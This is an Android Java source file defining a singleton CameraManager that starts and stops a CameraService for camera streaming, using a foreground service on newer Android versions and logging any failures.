package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.service.CameraService;

public class CameraManager {
    private static final String TAG = Constants.TAG + ":CamMgr";
    private static CameraManager instance;
    private final Context ctx;

    private CameraManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized CameraManager get(Context ctx) {
        if (instance == null) instance = new CameraManager(ctx);
        return instance;
    }

    public void startStream(String camera) {
        try {
            Intent intent = new Intent(ctx, CameraService.class);
            intent.putExtra("camera", camera);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Start stream failed", e);
        }
    }

    public void stopStream() {
        try {
            ctx.stopService(new Intent(ctx, CameraService.class));
        } catch (Exception e) {
            Log.e(TAG, "Stop stream failed", e);
        }
    }
}
